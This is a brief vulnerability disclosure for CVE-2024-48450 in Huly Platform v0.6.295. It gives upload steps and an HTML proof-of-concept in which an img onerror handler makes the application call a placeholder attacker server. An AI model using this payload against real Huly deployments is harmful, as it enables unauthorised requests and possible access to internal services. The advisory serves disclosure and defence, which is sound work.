# CVE-2024-48450: SSRF via file upload in Huly Platform

An arbitrary file upload vulnerability in Huly Platform v0.6.295 allows attackers to achieve server-side request forgery (SSRF) by uploading a crafted HTML file within the chat group. When a user opens the malicious file, the server inadvertently makes a request to the attacker’s server, potentially exposing internal services or allowing unauthorized data access.

PoC:

1. Open the chat feature
2. In any group or conversation, upload a HTML file.
3. Upload the following HTML file

```
<body>
<h1>Test</h1>
<img src=""><img src="a" onerror='var jsImg = new Image; jsImg.src="https://<link_to_your_server>";'></img>"></img>
</body>

```

4. Open the file and it your server will receive http requests from the application server.

Discovered by Bruno Menna, October 2024.
